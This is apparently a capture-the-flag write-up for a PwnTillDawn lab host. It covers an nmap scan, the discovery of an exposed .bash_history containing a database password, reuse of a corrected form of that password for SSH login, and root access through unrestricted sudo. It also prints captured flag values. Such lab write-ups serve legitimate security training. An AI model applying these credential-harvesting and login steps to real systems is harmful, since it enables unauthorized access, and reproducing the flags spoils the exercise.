PwntillDawn Target:  10.150.150.222 

### Basic Recon
```
└─# nmap -Pn -p- --min-rate 5000 $ip
Host is up (7.9s latency).
Not shown: 45844 filtered tcp ports (no-response), 19688 closed tcp ports (reset)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
10000/tcp open  snet-sensor-mgmt

```
Directory Bruteforce
```


```
found : http://10.150.150.222/.bash_history
```
flag40=3e11129fe2d30563999cd1d5602a1f7eb90e2176
./configure
cd /home/vega
ls -lah
ifconfig
sudo passwd rootsudo apt-key add jcameron-key.asc
sudo apt update 
sudo apt install webmin 
cd ..
mysqldump -u vega --password=puplfiction1994 magento2 > dumpmagento.sql
```
I found this pass and user, there is an ssh i will try it 
```
ega@10.150.150.222's password: 
Permission denied, please try again.
vega@10.150.150.222's password: 
Permission denied, please try again.
vega@10.150.150.222's password: 
```
The password doesn't work i will try to find that sql db
here : http://10.150.150.222/dumpmagento.sql, but it's an empty file.
on the pass `puplfiction1994` there was an error, i googled the film and it was pulp fiction:
Just change it `pulpfiction1994`
`91061fbccf2238f04fff4d0553732616b98bcd54`

## Privesc
```
vega@vega:~$ sudo -l -l
[sudo] password for vega: 
Matching Defaults entries for vega on vega:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User vega may run the following commands on vega:

Sudoers entry:
    RunAsUsers: ALL
    RunAsGroups: ALL
    Commands:
	ALL
vega@vega:~$ sudo su
root@vega:/home/vega# id
uid=0(root) gid=0(root) groups=0(root)
root@vega:/home/vega# id;hostnamectl
uid=0(root) gid=0(root) groups=0(root)
   Static hostname: vega
         Icon name: computer-vm
           Chassis: vm
        Machine ID: 4045ea6ba70e474f82a6f9a8438ac3b0
           Boot ID: 124dac1dc0c9402ba9f4f4422ecff0a7
    Virtualization: vmware
  Operating System: Ubuntu 18.04.4 LTS
            Kernel: Linux 4.15.0-66-generic
      Architecture: x86-64
```